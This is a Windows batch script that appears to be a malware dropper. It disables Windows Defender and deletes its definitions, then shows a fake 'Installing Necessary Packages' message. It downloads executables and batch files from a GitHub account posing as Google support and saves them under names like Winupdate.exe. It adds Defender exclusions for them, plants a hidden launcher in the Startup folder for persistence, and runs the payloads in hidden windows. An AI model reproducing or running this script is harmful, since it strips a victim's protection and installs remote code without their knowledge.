
sc stop WinDefend
sc config WinDefend start= disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true
powershell -command Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
powershell -command Set-MpPreference -DisableIOAVProtection $true
MpCmdRun -RemoveDefinitions -All
MpCmdRun -RemoveDefinitions -DynamicSignatures

echo  Installing Necessary Packages.....Please Wait.....

color 0a

cd  %temp%

cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
bitsadmin /transfer Packages /download /priority foreground https://github.com/supportgoogle34/files/raw/main/System.exe "C:\Users\noob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" 
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Users\noob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe"
Add-MpPreference -ExclusionProcess "C:\Users\noob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe"
 
powershell -command "start Winupdate.exe" 


curl https://raw.githubusercontent.com/supportgoogle34/files/main/kernal.bat > C:\Windows\kernal.bat
 

cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

echo "powershell.exe -command Start-Process -FilePath "C:\Windows\kernal.bat" -ArgumentList "args" -WindowStyle Hidden  " >> vlc.bat





curl https://raw.githubusercontent.com/supportgoogle34/files/main/Defeat-Defender-chaos.bat > C:\Windows\Defeat-Defender-chaos.bat
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Windows\Defeat-Defender-chaos.bat"
Add-MpPreference -ExclusionProcess "C:\Windows\Defeat-Defender-chaos.bat"

set pop=%systemroot%
powershell.exe -command Start-Process -FilePath "C:\Windows\Defeat-Defender-chaos.bat" -ArgumentList "args" -WindowStyle Hidden
start C:\Windows\Defeat-Defender-chaos.bat

C:\Windows\Defeat-Defender-chaos.bat
